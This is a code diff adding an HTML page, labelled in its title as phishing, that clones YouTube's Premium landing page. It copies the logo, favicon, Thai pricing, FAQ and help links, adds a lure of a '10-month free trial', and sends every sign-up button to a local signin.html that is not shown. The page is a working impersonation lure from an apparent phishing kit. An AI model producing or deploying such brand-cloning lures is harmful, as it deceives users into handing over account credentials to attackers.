@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Premium (Phishing)</title>
+    <link rel="icon" href="https://www.youtube.com/s/desktop/a386e432/img/favicon_32.png" type="image/x-icon">
+
+    <!-- css -->
+    <link rel="stylesheet" href="style.css">
+
+    <!-- google font -->
+    <link
+        href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
+        rel="stylesheet">
+
+    <!-- bootstrap -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css"
+        integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+
+    <!-- Google Tag Manager -->
+    <script>
+        (function (w, d, s, l, i) {
+            w[l] = w[l] || [];
+            w[l].push({
+                'gtm.start': new Date().getTime(),
+                event: 'gtm.js'
+            });
+            var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s),
+                dl = l != 'dataLayer' ? '&l=' + l : '';
+            j.async = true;
+            j.src =
+                'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
+            f.parentNode.insertBefore(j, f);
+        })(window, document, 'script', 'dataLayer', 'GTM-PLDGLJQ');
+    </script>
+
+    <style>
+        #accordionDetail1 {
+            display: none;
+        }
+
+        #accordionDetail2 {
+            display: none;
+        }
+
+        #accordionDetail3 {
+            display: none;
+        }
+
+        #accordionDetail4 {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Google Tag Manager (noscript) -->
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PLDGLJQ" height="0" width="0"
+            style="display:none;visibility:hidden"></iframe></noscript>
+    <!-- End Google Tag Manager (noscript) -->
+
+    <!-------------------------------------------------------------------------------------------- Nav Bar -->
+    <!------------------------------------------------------------------------------------------------------->
+
+    <header class="nav-bar">
+        <!-- section-left : logo, menu bar -->
+        <div class="menu-bar">
+            <svg class="ham-manu" viewBox="0 0 24 24" preserveAspectRatio="xMidYMid meet" focusable="false"
+                style="pointer-events: none; display: block; width: 1.5em; height: 1.5em;">
+                <g>
+                    <path fill="#606060" d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
+                </g>
+            </svg>
+        </div>
+        <div class="youtube-logo">
+            <svg viewBox="0 0 200 60" preserveAspectRatio="xMidYMid meet" focusable="false"
+                style="pointer-events: none; display: block; width: 5em; height: 1.5em;">
+                <g viewBox="0 0 200 60" preserveAspectRatio="xMidYMid meet">
+                    <g>
+                        <path fill="#FF0000" d="M63,14.87c-0.72-2.7-2.85-4.83-5.56-5.56C52.54,8,32.88,8,32.88,8S13.23,8,8.32,9.31
+                c-2.7,0.72-4.83,2.85-5.56,5.56C1.45,19.77,1.45,30,1.45,30s0,10.23,1.31,15.13c0.72,2.7,2.85,4.83,5.56,5.56
+                C13.23,52,32.88,52,32.88,52s19.66,0,24.56-1.31c2.7-0.72,4.83-2.85,5.56-5.56C64.31,40.23,64.31,30,64.31,30
+                S64.31,19.77,63,14.87z"></path>
+                        <polygon fill="#FFFFFF" points="26.6,39.43 42.93,30 26.6,20.57"></polygon>
+                    </g>
+                    <g>
+                        <g id="youtube-paths">
+                            <path fill="#282828" d="M92.69,48.03c-1.24-0.84-2.13-2.14-2.65-3.91c-0.52-1.77-0.79-4.12-0.79-7.06v-4
+                  c0-2.97,0.3-5.35,0.9-7.15c0.6-1.8,1.54-3.11,2.81-3.93c1.27-0.82,2.94-1.24,5.01-1.24c2.04,0,3.67,0.42,4.9,1.26
+                  c1.23,0.84,2.13,2.15,2.7,3.93c0.57,1.78,0.85,4.16,0.85,7.12v4c0,2.94-0.28,5.3-0.83,7.08c-0.55,1.78-1.45,3.09-2.7,3.91
+                  c-1.24,0.82-2.93,1.24-5.06,1.24C95.65,49.29,93.93,48.87,92.69,48.03z M99.66,43.71c0.34-0.9,0.52-2.37,0.52-4.4v-8.59
+                  c0-1.98-0.17-3.42-0.52-4.34c-0.34-0.91-0.95-1.37-1.82-1.37c-0.84,0-1.43,0.46-1.78,1.37c-0.34,0.91-0.52,2.36-0.52,4.34v8.59
+                  c0,2.04,0.16,3.51,0.49,4.4c0.33,0.9,0.93,1.35,1.8,1.35C98.71,45.06,99.31,44.61,99.66,43.71z"></path>
+                            <path fill="#282828" d="M188.16,37.13v1.39c0,1.77,0.05,3.09,0.16,3.98c0.1,0.88,0.32,1.53,0.65,1.93
+                  c0.33,0.4,0.84,0.61,1.53,0.61c0.93,0,1.57-0.36,1.91-1.08c0.34-0.72,0.53-1.92,0.56-3.6l5.35,0.31
+                  c0.03,0.24,0.04,0.57,0.04,0.99c0,2.55-0.7,4.45-2.09,5.71c-1.39,1.26-3.36,1.89-5.91,1.89c-3.06,0-5.2-0.96-6.43-2.88
+                  c-1.23-1.92-1.84-4.88-1.84-8.9v-4.81c0-4.14,0.64-7.15,1.91-9.06c1.27-1.9,3.45-2.85,6.54-2.85c2.13,0,3.76,0.39,4.9,1.17
+                  c1.14,0.78,1.94,1.99,2.41,3.64c0.46,1.65,0.7,3.93,0.7,6.83v4.72H188.16z M188.95,25.53c-0.31,0.39-0.52,1.03-0.63,1.91
+                  c-0.11,0.88-0.16,2.23-0.16,4.02v1.98h4.54v-1.98c0-1.77-0.06-3.11-0.18-4.02c-0.12-0.91-0.34-1.56-0.65-1.93
+                  c-0.31-0.37-0.8-0.56-1.46-0.56C189.75,24.94,189.26,25.14,188.95,25.53z"></path>
+                            <path fill="#282828" d="M77.59,36.61l-7.06-25.49h6.16l2.47,11.55c0.63,2.85,1.09,5.27,1.39,7.28h0.18
+                  c0.21-1.44,0.67-3.85,1.39-7.24l2.56-11.6h6.16L83.7,36.61v12.23h-6.11V36.61z"></path>
+                            <path fill="#282828" d="M126.45,21.28v27.55h-4.85l-0.54-3.37h-0.13c-1.32,2.55-3.3,3.82-5.93,3.82c-1.83,0-3.18-0.6-4.05-1.8
+                  c-0.87-1.2-1.3-3.07-1.3-5.62V21.28h6.2v20.23c0,1.23,0.13,2.11,0.4,2.63c0.27,0.52,0.72,0.79,1.35,0.79
+                  c0.54,0,1.06-0.16,1.55-0.49c0.49-0.33,0.86-0.75,1.1-1.26V21.28H126.45z"></path>
+                            <path fill="#282828" d="M158.27,21.28v27.55h-4.85l-0.54-3.37h-0.13c-1.32,2.55-3.3,3.82-5.93,3.82c-1.83,0-3.18-0.6-4.05-1.8
+                  c-0.87-1.2-1.3-3.07-1.3-5.62V21.28h6.2v20.23c0,1.23,0.13,2.11,0.4,2.63c0.27,0.52,0.72,0.79,1.35,0.79
+                  c0.54,0,1.06-0.16,1.55-0.49c0.49-0.33,0.86-0.75,1.1-1.26V21.28H158.27z"></path>
+                            <path fill="#282828" d="M143.31,16.11h-6.16v32.72h-6.07V16.11h-6.16v-4.99h18.38V16.11z">
+                            </path>
+                            <path fill="#282828" d="M178.8,25.69c-0.38-1.74-0.98-3-1.82-3.78c-0.84-0.78-1.99-1.17-3.46-1.17c-1.14,0-2.2,0.32-3.19,0.97
+                  c-0.99,0.64-1.75,1.49-2.29,2.54h-0.05l0-14.52h-5.98v39.11h5.12l0.63-2.61h0.13c0.48,0.93,1.2,1.66,2.16,2.2
+                  c0.96,0.54,2.02,0.81,3.19,0.81c2.1,0,3.64-0.97,4.63-2.9c0.99-1.93,1.48-4.95,1.48-9.06v-4.36
+                  C179.36,29.84,179.17,27.43,178.8,25.69z M173.11,36.93c0,2.01-0.08,3.58-0.25,4.72c-0.16,1.14-0.44,1.95-0.83,2.43
+                  c-0.39,0.48-0.91,0.72-1.57,0.72c-0.51,0-0.98-0.12-1.42-0.36c-0.43-0.24-0.79-0.6-1.06-1.08V27.71
+                  c0.21-0.75,0.57-1.36,1.08-1.84c0.51-0.48,1.06-0.72,1.66-0.72c0.63,0,1.12,0.25,1.46,0.74c0.34,0.49,0.58,1.33,0.72,2.49
+                  c0.13,1.17,0.2,2.83,0.2,4.99V36.93z"></path>
+                        </g>
+                    </g>
+                </g>
+            </svg>
+            <p>TH</p>
+        </div>
+
+        <!-- section-center : search bar -->
+        <form class="search-bar hidden-mobile">
+            <input class="search-input" type="search" placeholder="Search" aria-label="Search" />
+            <button type="submit" class="search-btn"><i class="far fa-search"></i></button>
+        </form>
+
+        <!-- section-right : tool bar -->
+        <div class="tool-bar">
+            <div class="icon-tool hidden-mobile">
+                <svg viewBox="0 0 24 24" preserveAspectRatio="xMidYMid meet" focusable="false"
+                    style="pointer-events: none; display: block; width: 1.5em; height: 1.5em;">
+                    <g>
+                        <path path fill="#606060"
+                            d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4zM14 13h-3v3H9v-3H6v-2h3V8h2v3h3v2z">
+                        </path>
+                    </g>
+                </svg>
+            </div>
+            <div class="icon-tool hidden-mobile">
+                <svg viewBox="0 0 24 24" preserveAspectRatio="xMidYMid meet" focusable="false"
+                    style="pointer-events: none; display: block; width: 1.5em; height: 1.5em;">
+                    <g>
+                        <path path fill="#606060"
+                            d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z">
+                        </path>
+                    </g>
+                </svg>
+            </div>
+            <div class="icon-tool">
+                <svg viewBox="0 0 24 24" preserveAspectRatio="xMidYMid meet" focusable="false"
+                    style="pointer-events: none; display: block; width: 1.5em; height: 1.5em;">
+                    <g>
+                        <path path fill="#606060"
+                            d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z">
+                        </path>
+                    </g>
+                </svg>
+            </div>
+            <div class="sign-in">
+                <svg viewBox="0 0 24 24" preserveAspectRatio="xMidYMid meet" focusable="false"
+                    style="pointer-events: none; display: block; width: 1.5em; height: 1.5em;">
+                    <g>
+                        <path path fill="#065fd4"
+                            d="M12,0 C18.62375,0 24,5.37625 24,12 C24,18.62375 18.62375,24 12,24 C5.37625,24 0,18.62375 0,12 C0,5.37625 5.37625,0 12,0 Z M12,10.63625 C13.66,10.63625 15,9.29625 15,7.63625 C15,5.97625 13.66,4.63625 12,4.63625 C10.34,4.63625 9,5.97625 9,7.63625 C9,9.29625 10.34,10.63625 12,10.63625 Z M12,12.40875 C8.33375,12.40875 5.455,14.18125 5.455,15.8175 C6.84125,17.95 9.26875,19.3625 12,19.3625 C14.73125,19.3625 17.15875,17.95 18.545,15.8175 C18.545,14.18125 15.66625,12.40875 12,12.40875 Z">
+                        </path>
+                    </g>
+                </svg>
+                <p>SIGN IN</p>
+            </div>
+        </div>
+    </header>
+
+
+    <div class="container">
+
+        <!-------------------------------------------------------------------------------------------- Section 1 -->
+        <!--------------------------------------------------------------------------------------------------------->
+        <section class="content-1">
+            <img style="margin-top: 3.5em;" class="w-80 mx-auto d-block"
+                src="img/ytr_lp2_logo_premium_desktop_552x71.png" alt="YouTube Premium Logo">
+
+            <h2 class="text-center">YouTube and YouTube Music ad-free,<br>offline, and in the background
+            </h2>
+
+            <a href="signin.html">
+                <button class="btn btn-primary btn-sm d-block mx-auto"
+                    style="background-color: #065fd4;border-radius: 0px;">TRY IT FREE</button>
+            </a><br>
+
+            <div class="detail-content">
+                <h4 class="text-center font-weight-light">10-month free trial • Then THB 159.00/month</h4>
+                <h6 class="text-center font-weight-light">We'll remind you 7 days before your trial ends<br>Recurring
+                    billing • Cancel anytime</h6>
+            </div>
+
+
+
+            <div class="link-all center-dis">
+                <!-- Link 1 -->
+                <div class="link1 text-center" id="link1" onclick="replace()">
+                    <p>Or save money with a <a style="color: var(--blue);">family or student plan</a></p>
+                </div>
+                <div class="link1_detail" id="link1_detail">
+                    <div class="row">
+                        <div class="col-8">
+                            <p>Family • 10-month free trial • Then THB 239.00/month</p>
+                            <p>Add up to 5 family members (ages 13+) in your household. <a target="_blank"
+                                    href="https://support.google.com/youtube/answer/7507349?visit_id=637402471130074390-2032857715&p=red_family_overview&hl=en&rd=1">Learn
+                                    more</a></p>
+                        </div>
+                        <div class="col-4">
+                            <a href="signin.html">
+                                <button style="margin: auto 0 auto auto !important;"
+                                    class="btn mybtn btn-primary btn-sm d-block mx-auto"
+                                    style="background-color: #065fd4;border-radius: 0px;">TRY IT FREE</button>
+                            </a>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="col-7">
+                            <p>Student • THB 95.00/month</p>
+                            <p>Eligible students only. Annual verification required.</p>
+                        </div>
+                        <div class="col-5" style="float: right;">
+                            <a href="signin.html">
+                                <button style="margin: auto 0 auto auto !important;"
+                                    class="btn mybtn btn-primary btn-sm d-block mx-auto"
+                                    style="background-color: #065fd4;border-radius: 0px;">
+                                    <svg viewBox="0 0 48 48" preserveAspectRatio="xMidYMid meet" focusable="false"
+                                        style="pointer-events: none; display: block; width: 1.5em; height: 1.5em;"
+                                        class="style-scope yt-icon">
+                                        <g fill="#fff" viewBox="0 0 48 48" class="style-scope yt-icon">
+                                            <path
+                                                d="M38 38H10V10h14V6H10c-2.21 0-4 1.79-4 4v28c0 2.21 1.79 4 4 4h28c2.21 0 4-1.79 4-4V24h-4v14zM28 6v4h7.17L15.51 29.66l2.83 2.83L38 12.83V20h4V6H28z"
+                                                class="style-scope yt-icon"></path>
+                                        </g>
+                                    </svg>
+                                    TRY IT FREE</button>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Link 2 -->
+                <p class="text-center"><a class="accordion">Restrictions apply. Learn more here.</a></p>
+            </div>
+
+        </section>
+    </div>
+
+    <div class="container-lg">
+        <!-------------------------------------------------------------------------------------------- Section 2 -->
+        <!--------------------------------------------------------------------------------------------------------->
+        <section class="content-2 center-dis">
+            <div class="row">
+                <div class="col-md-4">
+                    <img src="img/ytr_lp2_icon_feature_playtransparent_168x168.png" class="d-block mx-auto w-25 ">
+                    <br>
+                    <h2 class="text-center font-weight-light">Ad-free & background play</h2>
+                    <p class="text-center">Watch videos uninterrupted by ads, while using other apps, or when the screen
+                        is locked.</p>
+                </div>
+                <div class="col-md-4">
+                    <img src="img/ytm_lp2_icon_feature_download_168x168.png" class="d-block mx-auto w-25 ">
+                    <br>
+                    <h2 class="text-center font-weight-light">Downloads</h2>
+                    <p class="text-center">Save videos for when you really need them – like when you’re on a plane or
+                        commuting.
+                    </p>
+                </div>
+                <div class="col-md-4">
+                    <img src="img/ytr_lp2_icon_feature_musicapp_168x168.png" class="d-block mx-auto w-25 ">
+                    <br>
+                    <h2 class="text-center font-weight-light">YouTube Music<br>Premium</h2>
+                    <p class="text-center">Download our new music app and listen without interruptions.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-------------------------------------------------------------------------------------------- Section 3 -->
+        <!--------------------------------------------------------------------------------------------------------->
+
+        <section class="content-3">
+            <div class="content-3-bg">
+                <div class="row">
+                    <div class="col-6">
+                        <h1 style="font-weight: 300;">Uninterrupted YouTube</h1>
+                        <h5 tyle="font-weight: 200;">Watch your favorite videos ad-free, offline, and keep them playing
+                            when you close the app.</h5>
+                    </div>
+                </div>
+            </div>
+
+        </section>
+
+        <section class="content-4">
+            <div class="content-4-bg">
+                <div class="row">
+                    <div class="col-5"></div>
+                    <div class="col-7">
+                        <h1 style="font-weight: 300;">YouTube Music Premium</h1>
+                        <h5 tyle="font-weight: 200;">Get YouTube’s music streaming service ad-free, offline, and with
+                            the screen locked.</h5>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <br><br><br>
+
+        <section class="content-5" id="app">
+            <h3 class="font-weight-light">{{ faq }}</h3>
+            <br />
+            <div class="accordion">
+                <div class="accordionTab" @click="openAccordion(1)">
+                    What is included with YouTube Premium?
+                    <span class="float-right" id="arrow1" style="font-size: 0.9em"><i
+                            class="fas fa-chevron-down"></i></span>
+                </div>
+                <p id="accordionDetail1" class="font-weight-light" style="margin-top: 1.25em; font-size: 16px">
+                    <b>YouTube</b><br /> • Ad-free videos: Watch millions of videos uninterrupted by ads.
+                    <a href="https://support.google.com/youtube/answer/6308116">Learn more</a><br /> • Download videos
+                    to watch offline: Save videos and playlists on mobile devices and play them offline<br /> • Play in
+                    the background: Keep videos playing
+                    when using other apps or when your screen is off<br />
+                    <b>YouTube Music</b><br /> • Easily explore the world of music with the new and improved YouTube
+                    Music app<br /> • Ad-free music: Listen to millions of songs uninterrupted by ads<br /> • Download
+                    music to listen offline: Save music
+                    and playlists in the YouTube Music app and listen offline<br /> • Play in the background: Keep music
+                    playing when using other apps or when your screen is off<br />
+                    <b>YouTube Kids</b><br /> • Ad-free and offline play in the YouTube Kids app<br />
+                    <b>Google Play Music</b><br /> • Included at no additional cost for select countries. Click here to
+                    see if Google Play Music is available in your country.
+                </p>
+            </div>
+            <div class="accordion">
+                <div class="accordionTab" @click="openAccordion(2)">
+                    How does downloading videos and music work?
+                    <span class="float-right" id="arrow2" style="font-size: 0.9em"><i
+                            class="fas fa-chevron-down"></i></span>
+                </div>
+                <p id="accordionDetail2" class="font-weight-light" style="margin-top: 1.25em; font-size: 16px">
+                    Download videos and music on your mobile devices to watch and listen offline for up to 30 days
+                    without being connected to the internet. For more details on how to download videos and music,
+                    please see this Help Center article.
+                </p>
+            </div>
+            <div class="accordion">
+                <div class="accordionTab" @click="openAccordion(3)">
+                    What is background play?
+                    <span class="float-right" id="arrow3" style="font-size: 0.9em"><i
+                            class="fas fa-chevron-down"></i></span>
+                </div>
+                <p id="accordionDetail3" class="font-weight-light" style="margin-top: 1.25em; font-size: 16px">
+                    Background play allows videos and music to keep playing in the background, even when you open other
+                    apps or turn the screen off on your mobile device. For more details on background play, please see
+                    this Help Center article.
+                </p>
+            </div>
+            <div class="accordion">
+                <div class="accordionTab" @click="openAccordion(4)">
+                    How can I cancel my membership?
+                    <span class="float-right" id="arrow4" style="font-size: 0.9em"><i
+                            class="fas fa-chevron-down"></i></span>
+                </div>
+                <p id="accordionDetail4" class="font-weight-light" style="margin-top: 1.25em; font-size: 16px">
+                    You can cancel your membership by visiting the Paid Membership page. This will revert your account
+                    to free YouTube. You can rejoin YouTube Premium at any time.
+                </p>
+            </div>
+            <br><br>
+            <p class="my-5" style="font-size: 18px;">Have other questions? Visit the <a
+                    href="https://support.google.com/youtube/go/red_help">YouTube Help Center</a></p>
+        </section>
+
+    </div>
+
+
+
+
+    <!-------------------------------------------------------------------------------------------- Script -->
+    <!------------------------------------------------------------------------------------------------------>
+
+    <!-- bootstrap -->
+
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
+        integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj"
+        crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx"
+        crossorigin="anonymous"></script>
+
+    <!-- fontawsome -->
+    <script src="https://kit.fontawesome.com/6ddd12fa46.js" crossorigin="anonymous"></script>
+
+
+    <!-- vue cdn -->
+    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.12/dist/vue.js"></script>
+
+    <script>
+        // Vue CDN
+
+        var app = new Vue({
+            el: '#app',
+            data: {
+                accordionStatus: [false, false, false, false],
+                faq: 'FAQ'
+            },
+            methods: {
+                openAccordion: function (id) {
+                    if (this.accordionStatus[id - 1] == false) {
+                        document.querySelector("#arrow" + id).innerHTML =
+                            '<i class="fas fa-chevron-up"></i>';
+                        document.querySelector("#accordionDetail" + id).style.display = "block";
+                        this.accordionStatus[id - 1] = true;
+                    } else {
+                        document.querySelector("#arrow" + id).innerHTML =
+                            '<i class="fas fa-chevron-down"></i>';
+                        document.querySelector("#accordionDetail" + id).style.display = "none";
+                        this.accordionStatus[id - 1] = false;
+                    }
+                },
+            }
+        })
+
+        // ---------------------------------------------------------- Modal Function
+
+        // Get the modal
+        var modal = document.getElementById("myModal");
+
+        // Get the button that opens the modal
+        var btn = document.getElementById("myBtn");
+
+        // Get the <span> element that closes the modal
+        var span = document.getElementsByClassName("myClose")[0];
+
+        // When the user clicks the button, open the modal 
+        btn.onclick = function () {
+            modal.style.display = "block";
+        }
+
+        // When the user clicks on <span> (x), close the modal
+        span.onclick = function () {
+            modal.style.display = "none";
+        }
+
+        // When the user clicks anywhere outside of the modal, close it
+        window.onclick = function (event) {
+            if (event.target == modal) {
+                modal.style.display = "none";
+            }
+        }
+
+        // ---------------------------------------------------------- Accordion Function
+
+        function replace() {
+            document.getElementById('link1').style.display = "none";
+            document.getElementById('link1_detail').style.display = "block";
+        }
+    </script>
+
+    </script>
+
+
+</body>
+
+</html>
